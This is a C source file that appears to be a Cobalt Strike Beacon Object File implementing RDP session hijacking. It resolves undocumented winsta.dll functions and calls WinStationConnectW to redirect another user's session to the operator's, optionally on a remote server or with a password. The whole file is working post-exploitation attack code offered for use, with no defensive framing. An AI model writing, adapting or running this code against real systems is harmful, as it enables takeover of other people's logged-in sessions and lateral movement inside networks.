#include <windows.h>
#include "beacon.h"

#define SERVERNAME_CURRENT ((HANDLE)NULL)
#define WINSTATIONNAME_LENGTH 32
typedef WCHAR WINSTATIONNAME[WINSTATIONNAME_LENGTH + 1];
typedef BOOLEAN (WINAPI * WinStationNameFromLogonIdW_t) (HANDLE, ULONG, WINSTATIONNAME);
typedef BOOLEAN (WINAPI * WinStationConnectW_t) (HANDLE, ULONG, ULONG, WCHAR *, BOOL);
typedef HANDLE (WINAPI * WinStationOpenServerW_t) (PWSTR);
typedef HANDLE (WINAPI * WinStationCloseServer_t) (HANDLE);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError (void);
DECLSPEC_IMPORT WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE, LPCSTR);
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR);
DECLSPEC_IMPORT WINBASEAPI int WINAPI MSVCRT$wcscmp (wchar_t*, wchar_t*);

void go(char * args, int alen)
{
	datap parser;
	BeaconDataParse(&parser, args, alen);
	ULONG session = BeaconDataInt(&parser);
	ULONG targetSession = BeaconDataInt(&parser);
	WCHAR * password = L"";
	WCHAR * serverName = L"";
	WCHAR * command = (WCHAR *)BeaconDataExtract(&parser, NULL);
	HANDLE hServerName = SERVERNAME_CURRENT;
	WINSTATIONNAME Source;
	DWORD errorcode;
	WinStationConnectW_t WinStationConnectW = (WinStationConnectW_t)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("winsta.dll"),"WinStationConnectW");
	WinStationNameFromLogonIdW_t WinStationNameFromLogonIdW = (WinStationNameFromLogonIdW_t)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("winsta.dll"),"WinStationNameFromLogonIdW");
	WinStationOpenServerW_t WinStationOpenServerW = (WinStationOpenServerW_t)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("winsta.dll"),"WinStationOpenServerW");
	WinStationCloseServer_t WinStationCloseServer = (WinStationCloseServer_t)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("winsta.dll"),"WinStationCloseServer");
	
	if (session == 0 || targetSession ==0) {
		BeaconPrintf(CALLBACK_ERROR, "The session id was not in a correct format. Please try again.");
		return;	
	}
	
	if (!MSVCRT$wcscmp(command, L"password")) {
		password = (WCHAR *)BeaconDataExtract(&parser, NULL);
	} else if (!MSVCRT$wcscmp(command, L"server")) {
		serverName = (WCHAR *)BeaconDataExtract(&parser, NULL);
	}
	
	
	if (MSVCRT$wcscmp(serverName, L"")) {
		BeaconPrintf(CALLBACK_OUTPUT, "Connecting to server %ls...", serverName);
		hServerName = WinStationOpenServerW(serverName);
	} else if (!BeaconIsAdmin()) {
		BeaconPrintf(CALLBACK_ERROR, "You must run it in high integrity context!");
		return;	
	}
	
	if (!WinStationNameFromLogonIdW(hServerName, session, Source) || !WinStationNameFromLogonIdW(hServerName, targetSession, Source)) {
		errorcode = KERNEL32$GetLastError();
		if (errorcode == 5)
			BeaconPrintf(CALLBACK_ERROR, "Error %d: Access denied.", errorcode);
		else if (errorcode == 7022)
			BeaconPrintf(CALLBACK_ERROR, "Error %d: The session id cannot be found.", errorcode);
		else if (errorcode == 1722)
			BeaconPrintf(CALLBACK_ERROR, "Error %d: The RPC server is unavailable.", errorcode);
		else
			BeaconPrintf(CALLBACK_ERROR, "Error %d.", errorcode);
		WinStationCloseServer(hServerName);
		return;
	}
	
	BeaconPrintf(CALLBACK_OUTPUT, "Redirecting session id %d to session id %d...", targetSession, session);
	if (WinStationConnectW(hServerName, targetSession, session, password, TRUE)) {
		BeaconPrintf(CALLBACK_OUTPUT, "RDP hijacking is successful.");
	} else {
		errorcode = KERNEL32$GetLastError();
		if (errorcode == 1326)
			BeaconPrintf(CALLBACK_ERROR, "Error %d: Logon failure: unknown user name or bad password.", errorcode);
		else if (errorcode == 7069)
			BeaconPrintf(CALLBACK_ERROR, "Error %d: The target session is incompatible with the current session.", errorcode);
		else if (errorcode == 5)
			BeaconPrintf(CALLBACK_ERROR, "Error %d: Access denied.", errorcode);
		else if (errorcode == 1331)
			BeaconPrintf(CALLBACK_ERROR, "Error %d: This user cannot sign in because this account is currently disabled.", errorcode);
		else if (errorcode == 2250)
			BeaconPrintf(CALLBACK_ERROR, "Error %d: Unable to redirect session %d to session %d. Please check if the session %d is active.", errorcode, targetSession, session, session);
		else
			BeaconPrintf(CALLBACK_ERROR, "Error %d.", errorcode);
	}
	
	WinStationCloseServer(hServerName);
};